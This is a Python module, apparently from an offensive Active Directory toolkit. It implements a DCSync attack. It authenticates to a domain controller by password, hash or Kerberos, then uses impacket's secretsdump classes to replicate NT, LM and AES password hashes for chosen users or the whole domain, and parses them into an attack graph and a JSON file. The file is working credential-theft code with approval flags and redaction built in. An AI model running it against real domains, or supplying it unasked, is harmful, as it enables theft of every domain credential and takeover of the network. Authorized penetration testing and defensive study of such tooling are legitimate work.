"""DCSync — MS-DRSR replication-based hash extraction."""

from __future__ import annotations

import contextlib
import json
from typing import Any

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.redaction import redact
from adaf_attack.core.registry import (
    ApprovalPolicy,
    RiskLevel,
    RollbackClass,
    SafetyProfile,
    register_capability,
)
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target


@register_capability(
    id="dcsync",
    summary="Replicate NT/LM/aes secrets via MS-DRSR (DCSync)",
    category="credential-access",
    tags=("dcsync", "drsuapi", "replication", "secretsdump"),
    safety=SafetyProfile(
        risk=RiskLevel.SIDE_EFFECT,
        approval=ApprovalPolicy.FORCE_AND_ACK,
        rollback=RollbackClass.NONE,
        network_side_effect=True,
        exposes_credentials=True,
    ),
)
class Dcsync:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("dcsync")
        if not force:
            raise RuntimeError("dcsync requires --force")
        principals_source = kwargs.get("principals") or kwargs.get("users")
        just_dc_user = kwargs.get("just_user") or kwargs.get("sam")
        history = bool(kwargs.get("history"))
        if not target.has_credentials:
            raise RuntimeError("dcsync requires credentials with replicating-changes rights")

        principals: list[str] = []
        if just_dc_user:
            principals = [str(just_dc_user)]
        elif principals_source:
            from pathlib import Path

            path = Path(str(principals_source)).expanduser()
            if path.is_file():
                principals = [
                    line.strip()
                    for line in path.read_text(encoding="utf-8").splitlines()
                    if line.strip()
                ]
            else:
                principals = [
                    part.strip() for part in str(principals_source).split(",") if part.strip()
                ]

        session.log(
            "dcsync.start",
            target=target.dc_ip,
            principal_count=len(principals),
            history=history,
        )

        from impacket.examples.secretsdump import (
            NTDSHashes,
            RemoteOperations,
        )
        from impacket.smbconnection import SMBConnection

        smb = SMBConnection(target.dc_ip, target.dc_ip)
        lm, nt = target.lm_nt_hashes()
        if target.use_kerberos or target.ccache:
            smb.kerberosLogin(
                target.username or "",
                target.password or "",
                target.domain,
                lm,
                nt,
                aesKey=target.aes_key or "",
                kdcHost=target.dc_ip,
                useCache=True,
            )
        elif target.hashes:
            smb.login(target.username or "", "", target.domain, lm, nt)
        else:
            smb.login(target.username or "", target.password or "", target.domain)

        remote = RemoteOperations(smb, doKerberos=target.use_kerberos, kdcHost=target.dc_ip)
        remote.setExecMethod("smbexec")
        with contextlib.suppress(Exception):
            remote.enableRegistry()

        collected: list[dict[str, Any]] = []

        def _collect(secret_type: int, secret: Any) -> None:
            text = str(secret)
            collected.append({"raw": text, "type": secret_type})

        if not principals:
            raise RuntimeError(
                "dcsync requires -P sam=<user> or -P principals=<file-or-user>. "
                "Pass -P just_user=* only for an authorized full NTDS dump."
            )
        dump_users: list[str | None] = list(principals)
        if len(principals) == 1 and str(principals[0]).strip() == "*":
            dump_users = [None]
        no_lm = False
        try:
            for just_user in dump_users:
                ntds_hashes = NTDSHashes(
                    None,
                    None,
                    isRemote=True,
                    history=history,
                    noLMHash=no_lm,
                    remoteOps=remote,
                    useVSSMethod=False,
                    justNTLM=False,
                    pwdLastSet=True,
                    resumeSession=None,
                    outputFileName=None,
                    justUser=just_user,
                    printUserStatus=False,
                    perSecretCallback=lambda st, sec: _collect(st, sec),
                    skipUser=None,
                )
                ntds_hashes.dump()
        finally:
            with contextlib.suppress(Exception):
                remote.finish()

        parsed: list[dict[str, Any]] = []
        for record in collected:
            line = record["raw"]
            if ":" in line and line.count(":") >= 3:
                parts = line.split(":")
                parsed.append(
                    {
                        "principal": parts[0],
                        "rid": parts[1] if len(parts) > 1 else None,
                        "lm_hash": parts[2] if len(parts) > 2 else None,
                        "nt_hash": parts[3] if len(parts) > 3 else None,
                    }
                )
                sam = parts[0].split("\\")[-1]
                node = f"USER@{sam.upper()}@{target.domain.upper()}"
                graph.add_node(node, "User", sam=sam, dcsync_hash=True)
                graph.add_edge(node, node, "HasNtHash")

        result = {
            "domain": target.domain,
            "principal_filter": principals,
            "count": len(parsed),
            "entries": parsed,
        }
        redacted = redact(result, include_secrets=include_secrets)
        out = session.path("dcsync.json")
        out.write_text(json.dumps(redacted, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "dcsync.complete",
            count=len(parsed),
            include_secrets=include_secrets,
        )
        return dict(redacted) if isinstance(redacted, dict) else result
